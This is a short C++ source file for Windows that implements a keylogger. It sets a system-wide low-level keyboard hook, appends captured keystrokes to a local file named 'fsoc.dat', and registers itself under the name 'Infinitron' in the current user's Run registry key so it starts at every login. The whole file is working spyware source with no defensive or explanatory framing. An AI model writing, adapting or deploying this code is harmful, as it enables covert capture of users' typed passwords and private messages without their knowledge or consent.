#include <iostream>
#include <fstream>
#include <Windows.h>

// Global hook handle
HHOOK hookHandle;

// File for logging key strikes
std::ofstream logfile("fsoc.dat", std::ios::app); // Append mode

// Function to add Infinitron to Windows Registry for auto-start
void AddToRegistryAutoStart() {
    HKEY hKey;
    const char* keyPath = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    const char* valueName = "Infinitron";
    char executablePath[MAX_PATH];
    
    // Get the full path to the executable
    GetModuleFileName(NULL, executablePath, MAX_PATH);

    if (RegOpenKeyEx(HKEY_CURRENT_USER, keyPath, 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        if (RegSetValueEx(hKey, valueName, 0, REG_SZ, (BYTE*)executablePath, (DWORD)(strlen(executablePath) + 1)) == ERROR_SUCCESS) {
            // The registry entry was created successfully.
        } else {
            // Handle errors here.
        }
        RegCloseKey(hKey);
    } else {
        // Handle errors here.
    }
}

// Keyboard hook procedure
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            KBDLLHOOKSTRUCT* kbStruct = (KBDLLHOOKSTRUCT*)lParam;
            char key = MapVirtualKey(kbStruct->vkCode, 2); // Convert virtual key code to character

            // Check if the key is a letter, number, or special character
            if ((key >= 'A' && key <= 'Z') || (key >= 'a' && key <= 'z') || (key >= '0' && key <= '9') || key < 32) {
                // Log the simplified key
                logfile << "Key pressed: " << key << std::endl;
            }
        }
    }
    // Pass control to the next hook
    return CallNextHookEx(hookHandle, nCode, wParam, lParam);
}

int main() {
    // Add Infinitron to Windows Registry for auto-start
    AddToRegistryAutoStart();

    // Set the hook
    hookHandle = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);

    if (hookHandle == NULL) {
        std::cerr << "Failed to set hook." << std::endl;
        return 1;
    }

    // Message loop
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        // Process messages
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Unhook the keyboard hook
    UnhookWindowsHookEx(hookHandle);

    // Close the log file
    logfile.close();

    return 0;
}
